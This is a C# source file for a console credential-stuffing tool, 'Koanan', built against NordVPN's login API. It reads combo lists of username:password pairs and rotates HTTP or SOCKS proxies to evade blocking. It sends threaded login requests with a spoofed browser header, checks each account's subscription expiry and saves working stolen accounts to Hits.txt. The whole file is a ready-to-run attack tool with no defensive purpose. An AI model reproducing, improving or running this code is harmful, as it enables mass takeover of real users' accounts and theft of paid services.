

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace KoananVPN
{
  internal class Program
  {
    public static int badCounter = 0;
    public static int Expired = 0;
    public static int hitCounter = 0;
    public static int errorCounter = 0;
    public static int totalCounter = 0;
    public static int checkedCounter = 0;
    public static int comboNumber = 0;
    public static List<string> proxyList = new List<string>();
    public static string proxyType = "";
    public static int proxyNumber = 0;
    public static int proxyTotalCounter = 0;
    public static int stopCount = 0;
    public static string hitCombos;
    public static List<string> comboList = new List<string>();
    public static int CPM = 0;
    public static int CPM_aux = 0;

    [STAThread]
    private static void Main(string[] args)
    {
      ServicePointManager.DefaultConnectionLimit = 100000000;
      Colorful.Console.SetWindowSize(35, 35);
      Colorful.Console.Title = "[Koanan] | Start Menu";
      System.Console.Clear();
      Colorful.Console.WriteLine();
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.Write("                           ██╗░░██╗░█████╗░░█████╗░███╗░░██╗░█████╗░███╗░░██                            \n", Color.Red);
      Colorful.Console.Write("                           ██║░██╔╝██╔══██╗██╔══██╗████╗░██║██╔══██╗████╗░██║                           \n", Color.Red);
      Colorful.Console.Write("                           █████═╝░██║░░██║███████║██╔██╗██║███████║██╔██╗██║                           \n", Color.Red);
      Colorful.Console.Write("                           ██╔═██╗░██║░░██║██╔══██║██║╚████║██╔══██║██║╚████║                           \n", Color.Red);
      Colorful.Console.Write("                           ██║░╚██╗╚█████╔╝██║░░██║██║░╚███║██║░░██║██║░╚███║                           \n", Color.Red);
      Colorful.Console.Write("                           ╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝                           \n", Color.Red);
      Colorful.Console.Write("                                          Enjoy the your checking!                                      \n", Color.Red);
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.Write("                                                                                                        \n", Color.Red);
      Colorful.Console.WriteLine();
      Thread.Sleep(250);
      Colorful.Console.Write(DateTime.Now.ToString("[hh:mm:ss]"), Color.Orange);
      Colorful.Console.Write("> How many ", Color.White);
      Colorful.Console.Write("THREADS", Color.White);
      Colorful.Console.Write(" do you want to use", Color.White);
      Colorful.Console.Write(": ", Color.Orange);
      int maxDegreeOfParallelism = int.Parse(Colorful.Console.ReadLine());
      while (true)
      {
        Colorful.Console.Write(DateTime.Now.ToString("[hh:mm:ss]"), Color.Orange);
        Colorful.Console.Write("> What type of ", Color.White);
        Colorful.Console.Write("PROXIES ", Color.White);
        Colorful.Console.Write("[HTTP, SOCKS4, SOCKS5]", Color.Lime);
        Colorful.Console.Write(": ", Color.Lime);
        Program.proxyType = Colorful.Console.ReadLine();
        Program.proxyType = Program.proxyType.ToUpper();
        if (!Program.proxyType.Contains("HTTP") && !Program.proxyType.Contains("SOCKS4") && !Program.proxyType.Contains("SOCKS5"))
        {
          Colorful.Console.Write("> Please select a valid proxy format.\n\n", Color.Red);
          Thread.Sleep(2000);
        }
        else
          break;
      }
      Task.Factory.StartNew((Action) (() =>
      {
        while (true)
        {
          Program.CPM = Program.CPM_aux;
          Program.CPM_aux = 0;
          Colorful.Console.Title = string.Format("[Koanan] | Checked: {0}/{1} | Hits: {2} | Bad: {3} | Expired: {4} | Errors: {5} | CPM: ", (object) Program.checkedCounter, (object) Program.totalCounter, (object) Program.hitCounter, (object) Program.badCounter, (object) Program.Expired, (object) Program.errorCounter) + (Program.CPM * 60).ToString();
          Thread.Sleep(1000);
        }
      }));
      Task.Factory.StartNew((Action) (() =>
      {
        while (Program.stopCount != maxDegreeOfParallelism && Program.stopCount - 1 != maxDegreeOfParallelism - 1)
        {
          if (Program.hitCombos != "")
            System.IO.File.AppendAllText("Hits.txt", Program.hitCombos);
          Program.hitCombos = "";
          Thread.Sleep(1500);
        }
        Colorful.Console.WriteLine("\n> Done.", Color.White);
        Thread.Sleep(100000000);
        Environment.Exit(0);
      }));
      Colorful.Console.WriteLine();
      string fileName1;
      do
      {
        Colorful.Console.WriteLine("Select your Combos", Color.Lime);
        Thread.Sleep(500);
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Title = "Select Combo List";
        openFileDialog.DefaultExt = "txt";
        openFileDialog.Filter = "Text files|*.txt";
        openFileDialog.RestoreDirectory = true;
        int num = (int) openFileDialog.ShowDialog();
        fileName1 = openFileDialog.FileName;
      }
      while (!System.IO.File.Exists(fileName1));
      Program.comboList = new List<string>((IEnumerable<string>) System.IO.File.ReadAllLines(fileName1));
      using (FileStream fileStream = System.IO.File.Open(fileName1, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
      {
        using (BufferedStream bufferedStream = new BufferedStream((Stream) fileStream))
        {
          using (StreamReader streamReader = new StreamReader((Stream) bufferedStream))
          {
            while (streamReader.ReadLine() != null)
              ++Program.totalCounter;
          }
        }
      }
      Colorful.Console.Write("> ");
      Colorful.Console.Write(Program.totalCounter, Color.Aquamarine);
      Colorful.Console.WriteLine(" Combos added\n");
      string fileName2;
      do
      {
        Colorful.Console.WriteLine("Select your Proxies", Color.Lime);
        Thread.Sleep(500);
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Title = "Select Proxy List";
        openFileDialog.DefaultExt = "txt";
        openFileDialog.Filter = "Text files|*.txt";
        openFileDialog.RestoreDirectory = true;
        int num = (int) openFileDialog.ShowDialog();
        fileName2 = openFileDialog.FileName;
      }
      while (!System.IO.File.Exists(fileName2));
      Program.proxyList = new List<string>((IEnumerable<string>) System.IO.File.ReadAllLines(fileName2));
      using (FileStream fileStream = System.IO.File.Open(fileName2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
      {
        using (BufferedStream bufferedStream = new BufferedStream((Stream) fileStream))
        {
          using (StreamReader streamReader = new StreamReader((Stream) bufferedStream))
          {
            while (streamReader.ReadLine() != null)
              ++Program.proxyTotalCounter;
          }
        }
      }
      Colorful.Console.Write("> ");
      Colorful.Console.Write(Program.proxyTotalCounter, Color.Aquamarine);
      Colorful.Console.WriteLine(" Proxies added\n");
      for (int index = 1; index <= maxDegreeOfParallelism; ++index)
        new Thread(new ThreadStart(Program.Check)).Start();
      Colorful.Console.ReadLine();
    }

    public static void Check()
    {
      while (true)
      {
        if (Program.proxyNumber > Program.proxyList.Count<string>() - 2)
          Program.proxyNumber = 0;
        try
        {
          Interlocked.Increment(ref Program.proxyNumber);
          using (HttpRequest httpRequest = new HttpRequest())
          {
            if (Program.comboNumber >= Program.comboList.Count<string>())
            {
              ++Program.stopCount;
              break;
            }
            Interlocked.Increment(ref Program.comboNumber);
            string[] strArray = Program.comboList[Program.comboNumber].Split(':');
            string str1 = strArray[0] + ":" + strArray[1];
            try
            {
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.KeepAlive = true;
              if (Program.proxyType == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
              if (Program.proxyType == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
              if (Program.proxyType == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(Program.proxyList[Program.proxyNumber]);
              httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
              httpRequest.AddHeader("Accept", "*/*");
              string data = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", "{\"username\":\"" + strArray[0] + "\",\"password\":\"" + strArray[1] + "\"}", "application/json").ToString();
              if (data.Contains("user_id\":"))
              {
                string str2 = Program.Base64Encode("token:" + Utils.LRParse(data, "token\":\"", "\""));
                httpRequest.AddHeader("Authorization", "Basic " + str2);
                string str3 = Utils.LRParse(httpRequest.Get("https://api.nordvpn.com/v1/users/services").ToString(), "expires_at\":\"", "\"");
                if (DateTime.Compare(Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")), Convert.ToDateTime(str3)) < 0)
                {
                  ++Program.CPM_aux;
                  ++Program.checkedCounter;
                  ++Program.hitCounter;
                  Colorful.Console.WriteLine("[GOOD] " + str1, Color.Lime);
                  Program.hitCombos = Program.hitCombos + str1 + "\n";
                }
                else
                {
                  ++Program.CPM_aux;
                  ++Program.checkedCounter;
                  ++Program.Expired;
                  Colorful.Console.WriteLine("[EXPIRED] " + str1, Color.Red);
                }
              }
              else if (data.Contains("code\":101301"))
              {
                ++Program.CPM_aux;
                ++Program.checkedCounter;
                ++Program.badCounter;
                Colorful.Console.WriteLine("[BAD] " + str1, Color.DarkRed);
              }
              else if (data.Contains("message\":\"Unauthorized"))
              {
                ++Program.CPM_aux;
                ++Program.checkedCounter;
                ++Program.badCounter;
                Colorful.Console.WriteLine("[BAD] " + str1, Color.DarkRed);
              }
              else
              {
                ++Program.errorCounter;
                Program.comboList.Add(str1);
              }
            }
            catch (Exception ex)
            {
              Program.comboList.Add(str1);
              Interlocked.Increment(ref Program.errorCounter);
            }
          }
        }
        catch (Exception ex)
        {
          Interlocked.Increment(ref Program.errorCounter);
        }
      }
    }

    public static void CPM_Worker(object sender, ElapsedEventArgs e)
    {
      Program.CPM = Program.CPM_aux;
      Program.CPM_aux = 0;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    public static class TextTool
    {
      public static int CountStringOccurrences(string text, string pattern)
      {
        int num1 = 0;
        int startIndex = 0;
        int num2;
        while ((num2 = text.IndexOf(pattern, startIndex)) != -1)
        {
          startIndex = num2 + pattern.Length;
          ++num1;
        }
        return num1;
      }
    }
  }
}
